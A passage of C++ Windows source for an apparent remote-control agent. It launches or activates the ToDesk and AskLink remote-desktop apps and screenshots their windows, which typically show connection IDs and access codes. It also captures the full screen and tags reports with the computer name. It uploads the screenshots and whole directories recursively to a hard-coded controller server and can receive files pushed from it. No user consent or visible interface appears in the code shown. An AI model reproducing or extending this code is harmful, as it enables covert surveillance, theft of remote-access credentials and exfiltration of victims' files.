    // ===== 步骤5：有窗口且正常显示，直接截图 =====
    if (hwnd) {
        BringWindowToFrontAndWait(hwnd);
        goto do_capture;
    }

    // ===== 步骤6：无进程无精简版，直接放弃（调用方自行处理）=====
    {
        return L"";
    }

launch_app:
    if (!LaunchProcess(foundExePath)) {
        return L"";
    }
    hwnd = WaitForAppWindow(cfg.processNames);
    if (!hwnd) {
        return L"";
    }
    BringWindowToFrontAndWait(hwnd);

do_capture:
    {
        RECT rect = {};
        GetWindowRect(hwnd, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        if (w < 300 || h < 200) {
            Sleep(2000);
            BringWindowToFrontAndWait(hwnd);
        }
        wstring ts = Utf8ToWide(GetTimestamp());
        wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
        // 确保末尾有反斜杠
        if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
        wstring savePath = cacheDir + Utf8ToWide(cfg.filePrefix) + L"_" + ts + L".jpg";
        if (!CaptureHwndToFile(hwnd, savePath)) {
            return L"";
        }
        return savePath;
    }
}

// 通过 lnk 快捷方式查找 ToDesk 安装版路径
// 搜索顺序：当前用户桌面 → 公共开始菜单 → 当前用户开始菜单（各用系统变量获取）
wstring GetToDeskInstallPathFromLnk()
{
    static const GUID FOLDERID_Desktop_ = { 0xB4BFCC3A,0xDB2C,0x424C,{0xB0,0x29,0x7F,0xE9,0x9A,0x87,0xC6,0x41} };
    static const GUID FOLDERID_Programs_ = { 0xA77F5D77,0x2E2B,0x44C3,{0xA6,0xA2,0xAB,0xA6,0x01,0x05,0x4A,0x51} };
    static const GUID FOLDERID_CommonPrograms_ = { 0x0139D44E,0x6AFE,0x49F2,{0x86,0x90,0x3D,0xAF,0xCA,0xE6,0xFF,0xB5} };

    auto GetKF = [](const GUID& id) -> wstring {
        PWSTR p = nullptr;
        wstring r;
        if (SUCCEEDED(SHGetKnownFolderPath(id, KF_FLAG_DEFAULT, NULL, &p))) { r = p; CoTaskMemFree(p); }
        return r;
    };

    vector<wstring> lnkCandidates;

    // 桌面上的 ToDesk.lnk
    wstring desk = GetKF(FOLDERID_Desktop_);
    if (!desk.empty()) lnkCandidates.push_back(desk + L"\\ToDesk.lnk");
    // CSIDL 兜底
    { wchar_t buf[MAX_PATH] = {}; if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0) { wstring p(buf); if (p != desk) lnkCandidates.push_back(p + L"\\ToDesk.lnk"); } }

    // 开始菜单
    wstring cp = GetKF(FOLDERID_CommonPrograms_);
    if (!cp.empty()) lnkCandidates.push_back(cp + L"\\ToDesk\\ToDesk.lnk");
    wstring up = GetKF(FOLDERID_Programs_);
    if (!up.empty()) lnkCandidates.push_back(up + L"\\ToDesk\\ToDesk.lnk");
    { wchar_t buf[MAX_PATH] = {}; if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0) { wstring p(buf); if (p != cp) lnkCandidates.push_back(p + L"\\ToDesk\\ToDesk.lnk"); } }

    for (auto& lnk : lnkCandidates) {
        if (GetFileAttributesW(lnk.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        wstring exePath = ResolveLnkTarget(lnk);
        if (!exePath.empty() && GetFileAttributesW(exePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return exePath;
        }
    }
    return L"";
}

wstring CaptureToDesk()
{
    HWND hwnd = NULL;

    // ===== 步骤1：优先查找精简版进程 =====
    vector<DWORD> litePids = FindProcessByName(L"ToDesk_Lite.exe");
    vector<DWORD> fullPids = FindProcessByName(L"ToDesk.exe");

    if (!litePids.empty()) {
        // 有精简版进程，直接找窗口
        hwnd = FindProcessWindow(litePids[0]);
        if (!hwnd) {
            Sleep(500);
            hwnd = FindProcessWindow(litePids[0]);
        }
    }
    else if (!fullPids.empty()) {
        // 有完整版进程，直接找窗口
        hwnd = FindProcessWindow(fullPids[0]);
        if (!hwnd) {
            Sleep(500);
            hwnd = FindProcessWindow(fullPids[0]);
        }
    }

    // ===== 步骤2：没有进程，走启动流程 =====
    if (!hwnd) {
        // 搜索精简版路径
        vector<wstring> searchPaths;
        {
            static const GUID FOLDERID_Desktop_ = { 0xB4BFCC3A,0xDB2C,0x424C,{0xB0,0x29,0x7F,0xE9,0x9A,0x87,0xC6,0x41} };
            PWSTR p = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Desktop_, KF_FLAG_DEFAULT, NULL, &p))) {
                searchPaths.push_back(wstring(p) + L"\\ToDesk_Lite.exe");
                CoTaskMemFree(p);
            }
            wchar_t buf[MAX_PATH] = {};
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
                searchPaths.push_back(wstring(buf) + L"\\ToDesk_Lite.exe");
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
                searchPaths.push_back(wstring(buf) + L"\\ToDesk_Lite.exe");
            searchPaths.push_back(GetSystemDrive() + L"\\Users\\Default\\Desktop\\ToDesk_Lite.exe");
            searchPaths.push_back(GetSystemDrive() + L"\\Users\\Public\\Desktop\\ToDesk_Lite.exe");
        }

        wstring litePath;
        for (auto& sp : searchPaths) {
            if (GetFileAttributesW(sp.c_str()) != INVALID_FILE_ATTRIBUTES) {
                litePath = sp;
                break;
            }
        }

        if (!litePath.empty()) {
            if (!LaunchProcess(litePath)) return L"";
        }
        else {
            wstring installPath = GetToDeskInstallPathFromLnk();
            if (installPath.empty()) return L"";
            if (!LaunchProcess(installPath)) return L"";
        }

        hwnd = WaitForAppWindow({ L"ToDesk_Lite.exe", L"ToDesk.exe" });
        if (!hwnd) return L"";
    }

    // ===== 步骤3：截图 =====
    if (IsIconic(hwnd)) {
        ShowWindow(hwnd, SW_RESTORE);
        Sleep(500);  // 还原窗口只需短暂等待
    }
    else {
        ShowWindow(hwnd, SW_SHOWNORMAL);
    }
    SetForegroundWindow(hwnd);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    Sleep(300);  // 有进程时窗口已存在，只需短暂等待置顶生效
    SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

    // 窗口尺寸检查，有进程时窗口已正常，一般不需要额外等待
    RECT rect = {};
    GetWindowRect(hwnd, &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;
    if (w < 300 || h < 200) {
        Sleep(1000);  // 窗口异常才等待
        BringWindowToFrontAndWait(hwnd);
    }

    wstring ts = Utf8ToWide(GetTimestamp());
    wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
    if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
    wstring savePath = cacheDir + L"todesk_" + ts + L".jpg";
    if (!CaptureHwndToFile(hwnd, savePath)) return L"";
    return savePath;
}

// ===== 连连控截图 =====
wstring CaptureAskLink()
{
    RemoteAppConfig cfg;
    cfg.filePrefix = "asklink";
    cfg.liteProcessName = L"";  // 连连控无精简版概念
    cfg.processNames = { L"AskLink.exe" };
    cfg.liteSearchPaths = {};
    // 步骤6（找不到进程也找不到lnk路径）：用 LaunchAskLink 里的逻辑启动
    // CaptureRemoteApp 步骤6会因 registryUninstallKeys 为空而返回空，
    // 外层再调用 LaunchAskLink 补启动。
    // 但截图框架需要窗口句柄，LaunchAskLink 只启动不返回句柄，
    // 所以这里重写截图流程，复用 CaptureRemoteApp 处理"进程已存在"的部分，
    // 无进程时用 LaunchAskLink 启动再等窗口截图。

    // ===== 获取cpuTag（用于回报）=====
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    // ===== 步骤1：查找 AskLink.exe 进程 =====
    auto pids = FindProcessByName(L"AskLink.exe");
    HWND hwnd = NULL;

    if (!pids.empty()) {
        hwnd = FindProcessWindow(pids[0]);
        if (hwnd && IsIconic(hwnd)) {
            // 最小化：还原
            ShowWindow(hwnd, SW_RESTORE);
            SetForegroundWindow(hwnd);
            Sleep(800);
        }
        if (hwnd) {
            BringWindowToFrontAndWait(hwnd);
            goto asklink_capture;
        }
        // 有进程但找不到窗口，等一下
        Sleep(1000);
        hwnd = FindProcessWindow(pids[0]);
        if (hwnd) { BringWindowToFrontAndWait(hwnd); goto asklink_capture; }
    }

    // ===== 步骤2：无进程，通过 lnk 启动 =====
    {
        // 临时用 INVALID_SOCKET 调 LaunchAskLink，不回报启动结果（截图结果已能说明问题）
        string launchResult = LaunchAskLink(INVALID_SOCKET, cpuTag);
        if (launchResult != "OK") {
            return L"";
        }
        hwnd = WaitForAppWindow({ L"AskLink.exe" });
        if (!hwnd) { return L""; }
        BringWindowToFrontAndWait(hwnd);
    }

asklink_capture:
    {
        RECT rect = {};
        GetWindowRect(hwnd, &rect);
        int w = rect.right - rect.left, h = rect.bottom - rect.top;
        if (w < 200 || h < 100) {
            Sleep(2000);
            BringWindowToFrontAndWait(hwnd);
        }
        wstring ts = Utf8ToWide(GetTimestamp());
        wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
        if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
        wstring savePath = cacheDir + L"asklink_" + ts + L".jpg";
        if (!CaptureHwndToFile(hwnd, savePath)) { return L""; }
        return savePath;
    }
}

// ===== 打开连连控 =====
// 存在进程→激活窗口；不存在→lnk启动
// 返回结果字符串回报给控制端
string DoOpenAskLink()
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    auto pids = FindProcessByName(L"AskLink.exe");
    if (!pids.empty()) {
        // 进程存在：通过进程路径找到exe，激活窗口置顶
        wstring exePath = GetProcessExePath(pids[0]);
        HWND hwnd = FindProcessWindow(pids[0]);
        if (hwnd) {
            BringWindowToFrontAndWait(hwnd);
            return "OPEN_OK|AskLink|" + cpuTag;
        }
        // 有进程但无窗口，尝试重启
        if (!exePath.empty()) {
            KillProcessesByNames({ L"AskLink.exe", L"AskLinkSession.exe" });
            if (LaunchProcess(exePath)) {
                hwnd = WaitForAppWindow({ L"AskLink.exe" });
                if (hwnd) { BringWindowToFrontAndWait(hwnd); return "OPEN_OK|AskLink|" + cpuTag; }
            }
        }
    }

    // 无进程：用 lnk 启动
    string launchResult = LaunchAskLink(INVALID_SOCKET, cpuTag);
    if (launchResult == "OK") {
        HWND hwnd = WaitForAppWindow({ L"AskLink.exe" });
        if (hwnd) BringWindowToFrontAndWait(hwnd);
        return "OPEN_OK|AskLink|" + cpuTag;
    }
    return "OPEN_FAIL|AskLink未找到或启动失败|" + cpuTag;
}

// ===== 打开ToDesk（精简版优先）=====
string DoOpenToDesk()
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    // 获取桌面路径（用于查找精简版）
    auto GetUserDesktop = []() -> wstring {
        static const GUID FOLDERID_Desktop_ = { 0xB4BFCC3A,0xDB2C,0x424C,{0xB0,0x29,0x7F,0xE9,0x9A,0x87,0xC6,0x41} };
        PWSTR p = nullptr;
        wstring r;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Desktop_, KF_FLAG_DEFAULT, NULL, &p))) { r = p; CoTaskMemFree(p); }
        if (r.empty()) {
            wchar_t buf[MAX_PATH] = {};
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf))) r = buf;
        }
        return r;
    };

    wstring desktop = GetUserDesktop();
    wstring liteOnDesktop = desktop.empty() ? L"" : desktop + L"\\ToDesk_Lite.exe";

    auto litePids = FindProcessByName(L"ToDesk_Lite.exe");
    auto fullPids = FindProcessByName(L"ToDesk.exe");

    // ===== 情况1：精简版进程存在 =====
    if (!litePids.empty()) {
        HWND hwnd = FindProcessWindow(litePids[0]);
        if (hwnd) { BringWindowToFrontAndWait(hwnd); return "OPEN_OK|ToDesk_Lite已激活|" + cpuTag; }
        // 有进程无窗口，重启精简版
        wstring exePath = GetProcessExePath(litePids[0]);
        KillProcessesByNames({ L"ToDesk_Lite.exe", L"ToDesk.exe" });
        if (!exePath.empty() && LaunchProcess(exePath)) {
            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk_Lite已启动|" + cpuTag; }
        }
        return "OPEN_FAIL|ToDesk_Lite进程无窗口且重启失败|" + cpuTag;
    }

    // ===== 情况2：仅完整版进程存在 =====
    if (!fullPids.empty()) {
        // 桌面有精简版？切换
        if (!liteOnDesktop.empty() && GetFileAttributesW(liteOnDesktop.c_str()) != INVALID_FILE_ATTRIBUTES) {
            KillProcessesByNames({ L"ToDesk.exe", L"ToDesk_Lite.exe" });
            if (LaunchProcess(liteOnDesktop)) {
                HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
                if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|切换到ToDesk_Lite|" + cpuTag; }
            }
            return "OPEN_FAIL|ToDesk_Lite启动失败|" + cpuTag;
        }
        // 无精简版，直接激活完整版
        HWND hwnd = FindProcessWindow(fullPids[0]);
        if (hwnd) { BringWindowToFrontAndWait(hwnd); return "OPEN_OK|ToDesk完整版已激活|" + cpuTag; }
        wstring exePath = GetProcessExePath(fullPids[0]);
        KillProcessesByNames({ L"ToDesk.exe" });
        if (!exePath.empty() && LaunchProcess(exePath)) {
            HWND hw = WaitForAppWindow({ L"ToDesk.exe" });
            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk完整版已启动|" + cpuTag; }
        }
        return "OPEN_FAIL|ToDesk完整版重启失败|" + cpuTag;
    }

    // ===== 情况3：无任何进程 =====
    // 先查桌面精简版
    if (!liteOnDesktop.empty() && GetFileAttributesW(liteOnDesktop.c_str()) != INVALID_FILE_ATTRIBUTES) {
        if (LaunchProcess(liteOnDesktop)) {
            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk_Lite已启动|" + cpuTag; }
        }
        return "OPEN_FAIL|ToDesk_Lite启动失败|" + cpuTag;
    }
    // 再查 lnk（安装版）
    wstring installPath = GetToDeskInstallPathFromLnk();
    if (!installPath.empty()) {
        if (LaunchProcess(installPath)) {
            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe", L"ToDesk.exe" });
            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk安装版已启动|" + cpuTag; }
        }
        return "OPEN_FAIL|ToDesk安装版启动失败|" + cpuTag;
    }
    return "OPEN_FAIL|未找到任何ToDesk|" + cpuTag;
}

// 截全屏，保存到程序根目录，返回文件路径（失败返回空）
wstring CaptureFullScreen()
{
    wstring ts = Utf8ToWide(GetTimestamp());
    wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
    if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
    wstring savePath = cacheDir + L"fullscreen_" + ts + L".jpg";
    if (!CaptureHwndToFile(NULL, savePath)) return L"";
    return savePath;
}

// ===== 文件传输（走独立9001端口）=====

// 原函数末尾是 Sleep(500) 就直接返回，改为等 PAIR_OK

SOCKET ConnectFilePort(const string& taskId)  // ★ 新增taskId参数
{
    SOCKET fs = socket(AF_INET, SOCK_STREAM, 0);
    if (fs == INVALID_SOCKET) return INVALID_SOCKET;

    int bufSize = 1024 * 1024;
    setsockopt(fs, SOL_SOCKET, SO_SNDBUF, (char*)&bufSize, sizeof(bufSize));
    setsockopt(fs, SOL_SOCKET, SO_RCVBUF, (char*)&bufSize, sizeof(bufSize));

    DWORD timeout = 15000;
    setsockopt(fs, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(fs, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(FILE_SERVER_PORT); // 9001
    struct hostent* he = gethostbyname(SERVER_IP);
    if (he) addr.sin_addr = *(struct in_addr*)he->h_addr;
    else { closesocket(fs); return INVALID_SOCKET; }

    if (connect(fs, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(fs);
        return INVALID_SOCKET;
    }

    // ★ 新握手格式：AGENT|UniqueKey|TaskID
    string hello = "AGENT:" + GetMacForRelay() + "|" + taskId;
    // 注意：为兼容服务端解析，格式统一为 "AGENT|MAC|TaskID"
    hello = "AGENT|" + GetMacForRelay() + "|" + taskId;
    vector<char> helloData(hello.begin(), hello.end());
    SendPacketBin(fs, CMD_FILE_HELLO, helloData);

    // ★ 等服务端回 PAIR_OK（替代原来的 Sleep(500)）
    // 超时已设为15秒
    unsigned int pairCmd;
    vector<char> pairData;
    if (!RecvPacketBin(fs, pairCmd, pairData) || pairCmd != CMD_PAIR_OK) {
        closesocket(fs);
        return INVALID_SOCKET;
    }

    // 恢复无超时（文件传输时间不确定）
    DWORD noTo = 0;
    setsockopt(fs, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));
    setsockopt(fs, SOL_SOCKET, SO_RCVTIMEO, (char*)&noTo, sizeof(noTo));

    return fs;
}


// 被控端接收文件（控制端→被控端），监听9002端口
// 在独立线程里运行
void RecvFileFromCtrl(const string& saveDir, const string& taskId)  // ★ 去掉默认值，加taskId参数
{
    SOCKET clientSock = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSock == INVALID_SOCKET) return;

    int bufSize = 4 * 1024 * 1024;
    setsockopt(clientSock, SOL_SOCKET, SO_RCVBUF, (char*)&bufSize, sizeof(bufSize));

    DWORD timeout = 30000;
    setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(clientSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(FILE_RECV_PORT);  // 9002
    struct hostent* he = gethostbyname(SERVER_IP);
    if (he) addr.sin_addr = *(struct in_addr*)he->h_addr;
    else { closesocket(clientSock); return; }

    if (connect(clientSock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(clientSock); return;
    }

    // ★ 新握手格式：AGENT|UniqueKey|TaskID
    string hello = "AGENT|" + GetMacForRelay() + "|" + taskId;
    vector<char> helloData(hello.begin(), hello.end());
    SendPacketBin(clientSock, CMD_FILE_HELLO, helloData);

    // ★ 等 PAIR_OK
    unsigned int pairCmd;
    vector<char> pairData;
    if (!RecvPacketBin(clientSock, pairCmd, pairData) || pairCmd != CMD_PAIR_OK) {
        closesocket(clientSock); return;
    }

    // 恢复无超时
    DWORD noTo = 0;
    setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&noTo, sizeof(noTo));

    // ★ 以下一行不动，保留原函数从 firstCmd 开始的全部代码
    unsigned int firstCmd;
    vector<char> firstData;
    if (!RecvPacketBin(clientSock, firstCmd, firstData)) {
        closesocket(clientSock); return;
    }

    vector<char> beginData;
    if (firstCmd == CMD_FILE_RESUME) {
        string fnameUtf8(firstData.data(), firstData.size());
        wstring wSaveDirTemp = saveDir.empty() ? GetExeDir() : Utf8ToWide(saveDir);
        wstring partPath = wSaveDirTemp + L"\\" + Utf8ToWide(fnameUtf8) + L".part";
        ULONGLONG existSize = 0;
        HANDLE hCheck = CreateFileW(partPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hCheck != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER li; GetFileSizeEx(hCheck, &li);
            existSize = (ULONGLONG)li.QuadPart;
            CloseHandle(hCheck);
        }
        ULONGLONG netExist = HToNLL(existSize);
        char offBuf[8];
        memcpy(offBuf, &netExist, 8);
        SendAll(clientSock, offBuf, 8);

        unsigned int cmd2;
        if (!RecvPacketBin(clientSock, cmd2, beginData) || cmd2 != CMD_FILE_BEGIN) {
            closesocket(clientSock); return;
        }
    }
    else if (firstCmd == CMD_FILE_BEGIN) {
        beginData = firstData;
    }
    else {
        closesocket(clientSock); return;
    }

    if (beginData.size() < 17) { closesocket(clientSock); return; }

    ULONGLONG totalSize = 0, startOffset = 0;
    memcpy(&totalSize, beginData.data(), 8); totalSize = NToHLL(totalSize);
    memcpy(&startOffset, beginData.data() + 8, 8); startOffset = NToHLL(startOffset);
    string fnameUtf8(beginData.data() + 16, beginData.size() - 16);

    // ★ 优先用传入的目录，否则用被控端程序所在目录
    wstring wSaveDir;
    if (!saveDir.empty())
        wSaveDir = Utf8ToWide(saveDir);
    else
        wSaveDir = GetExeDir();

    // 只取文件名部分（防止fnameUtf8含路径）
    wstring wfname = Utf8ToWide(fnameUtf8);
    size_t slashPos = wfname.rfind(L'\\');
    if (slashPos != wstring::npos) wfname = wfname.substr(slashPos + 1);

    wstring savePath = wSaveDir + L"\\" + wfname;
    wstring partPath = savePath + L".part";

    HANDLE hFile = CreateFileW(partPath.c_str(), GENERIC_WRITE, 0, NULL,
        startOffset > 0 ? OPEN_EXISTING : CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        closesocket(clientSock); return;
    }
    if (startOffset > 0) {
        LARGE_INTEGER li; li.QuadPart = (LONGLONG)startOffset;
        SetFilePointerEx(hFile, li, NULL, FILE_BEGIN);
    }

    ULONGLONG received = startOffset;
    DWORD lastTick = GetTickCount();
    ULONGLONG lastBytes = startOffset;

    while (received < totalSize) {
        unsigned int chunkCmd;
        vector<char> chunkData;
        if (!RecvPacketBin(clientSock, chunkCmd, chunkData)) {
            break;
        }
        if (chunkCmd == CMD_FILE_END) break;
        if (chunkCmd != CMD_FILE_CHUNK) continue;

        DWORD written = 0;
        WriteFile(hFile, chunkData.data(), (DWORD)chunkData.size(), &written, NULL);
        received += written;

        DWORD now = GetTickCount();
        if (now - lastTick >= 1000) {
            lastTick = now;
            lastBytes = received;
        }
    }
    CloseHandle(hFile);
    closesocket(clientSock);

    DeleteFileW(savePath.c_str());
    MoveFileW(partPath.c_str(), savePath.c_str());
}

// ★ 直接在指定socket上发送文件（截图专用，走9003不走9001）
void SendFileOnSock(SOCKET sock, const wstring& filePath)
{
    EnterCriticalSection(&g_fileSendLock);  // ← 新增：函数入口加锁
    // ★ 文件发送期间设置30秒发送超时，防止控制端异常时永久阻塞
    DWORD sendTimeout = 30000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&sendTimeout, sizeof(sendTimeout));

    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // ★ 打开失败也要恢复超时
        DWORD noTo = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));
        LeaveCriticalSection(&g_fileSendLock);  // ← 加这行
        return;
    }

    LARGE_INTEGER li;
    GetFileSizeEx(hFile, &li);
    ULONGLONG totalSize = (ULONGLONG)li.QuadPart;

    wstring wfname = filePath;
    size_t pos = wfname.rfind(L'\\');
    if (pos != wstring::npos) wfname = wfname.substr(pos + 1);
    string fnameUtf8 = WideToUtf8(wfname);

    vector<char> beginPkt(16 + fnameUtf8.size());
    ULONGLONG netTotal = HToNLL(totalSize);
    ULONGLONG netOffset = HToNLL((ULONGLONG)0);
    memcpy(beginPkt.data(), &netTotal, 8);
    memcpy(beginPkt.data() + 8, &netOffset, 8);
    memcpy(beginPkt.data() + 16, fnameUtf8.data(), fnameUtf8.size());
    SendPacketSafe(sock, CMD_FILE_BEGIN, beginPkt);

    vector<char> buf(FILE_CHUNK_SIZE);
    ULONGLONG sent = 0;
    while (sent < totalSize) {
        DWORD toRead = (DWORD)min((ULONGLONG)FILE_CHUNK_SIZE, totalSize - sent);
        DWORD didRead = 0;
        if (!ReadFile(hFile, buf.data(), toRead, &didRead, NULL) || didRead == 0) break;
        buf.resize(didRead);
        SendPacketSafe(sock, CMD_FILE_CHUNK, buf);
        buf.resize(FILE_CHUNK_SIZE);
        sent += didRead;
    }
    CloseHandle(hFile);
    SendPacketSafe(sock, CMD_FILE_END, vector<char>());

    // ★ 发完恢复无超时，不影响后续接收
    DWORD noTo = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));
    LeaveCriticalSection(&g_fileSendLock);  // ← 新增：函数出口释放
}

// ★ 新增：在已配对的独立socket上发文件（截图/文件回传专用）
void SendFileOnNewSock(SOCKET fs, const wstring& filePath)
{
    DWORD sendTimeout = 30000;
    setsockopt(fs, SOL_SOCKET, SO_SNDTIMEO, (char*)&sendTimeout, sizeof(sendTimeout));

    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER li; GetFileSizeEx(hFile, &li);
    ULONGLONG totalSize = (ULONGLONG)li.QuadPart;

    wstring wfname = filePath;
    size_t pos = wfname.rfind(L'\\');
    if (pos != wstring::npos) wfname = wfname.substr(pos + 1);
    string fnameUtf8 = WideToUtf8(wfname);

    vector<char> beginPkt(16 + fnameUtf8.size());
    ULONGLONG netTotal = HToNLL(totalSize);
    ULONGLONG netOffset = HToNLL(0ULL);
    memcpy(beginPkt.data(), &netTotal, 8);
    memcpy(beginPkt.data() + 8, &netOffset, 8);
    memcpy(beginPkt.data() + 16, fnameUtf8.data(), fnameUtf8.size());
    SendPacketBin(fs, CMD_FILE_BEGIN, beginPkt);

    vector<char> buf(FILE_CHUNK_SIZE);
    ULONGLONG sent = 0;
    while (sent < totalSize) {
        DWORD toRead = (DWORD)min((ULONGLONG)FILE_CHUNK_SIZE, totalSize - sent);
        DWORD didRead = 0;
        if (!ReadFile(hFile, buf.data(), toRead, &didRead, NULL) || didRead == 0) break;
        buf.resize(didRead);
        SendPacketBin(fs, CMD_FILE_CHUNK, buf);
        buf.resize(FILE_CHUNK_SIZE);
        sent += didRead;
    }
    CloseHandle(hFile);
    SendPacketBin(fs, CMD_FILE_END, vector<char>());
}

// 递归收集目录下所有文件的相对路径
void CollectFilesRecursive(const wstring& baseDir, const wstring& curDir,
    vector<pair<wstring, wstring>>& files)  // <绝对路径, 相对路径>
{
    wstring searchPath = curDir + L"\\*";
    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        wstring name = ffd.cFileName;
        if (name == L"." || name == L"..") continue;
        wstring fullPath = curDir + L"\\" + name;
        // 相对路径：去掉 baseDir 前缀
        wstring relPath = fullPath.substr(baseDir.size());
        if (!relPath.empty() && relPath[0] == L'\\') relPath = relPath.substr(1);
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            CollectFilesRecursive(baseDir, fullPath, files);
        else
            files.push_back({ fullPath, relPath });
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
}

void SendDirToCtrl(SOCKET mainSock, const string& dirPathUtf8, const string& dirTaskId)
{
    wstring wdir = Utf8ToWide(dirPathUtf8);
    if (GetFileAttributesW(wdir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        string err = "ERROR:目录不存在:" + dirPathUtf8;
        SendPacketSafe(mainSock, CMD_DELETE_RES,
            vector<char>(err.begin(), err.end()));
        return;
    }

    vector<pair<wstring, wstring>> files;
    CollectFilesRecursive(wdir, wdir, files);

    if (files.empty()) {
        string msg = "ERROR:目录为空或无文件:" + dirPathUtf8;
        SendPacketSafe(mainSock, CMD_DIR_FILE_COUNT,
            vector<char>(msg.begin(), msg.end()));
        return;
    }

    wstring wdirName = wdir;
    size_t pos = wdirName.rfind(L'\\');
    if (pos != wstring::npos) wdirName = wdirName.substr(pos + 1);
    string dirName = WideToUtf8(wdirName);

    // ★ 新格式：目录名\n文件总数\nDirTaskID
    string countMsg = dirName + "\n" + to_string(files.size()) + "\n" + dirTaskId;
    SendPacketSafe(mainSock, CMD_DIR_FILE_COUNT,
        vector<char>(countMsg.begin(), countMsg.end()));

    // ★ 注册等待事件（按TaskID）
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    EnterCriticalSection(&g_dirReadyMapLock);
    g_dirReadyMap[dirTaskId] = hEvent;
    LeaveCriticalSection(&g_dirReadyMapLock);

    // 等控制端回 CMD_DIR_READY（最多10秒）
    DWORD waitResult = WaitForSingleObject(hEvent, 10000);

    // 清理事件注册
    EnterCriticalSection(&g_dirReadyMapLock);
    g_dirReadyMap.erase(dirTaskId);
    LeaveCriticalSection(&g_dirReadyMapLock);
    CloseHandle(hEvent);

    if (waitResult != WAIT_OBJECT_0) {
        return;
    }

    // ★ 逐个发送文件，每个文件用 DirTaskID_序号 作为TaskID
    for (int fileIndex = 0; fileIndex < (int)files.size(); fileIndex++) {
        auto& kv = files[fileIndex];
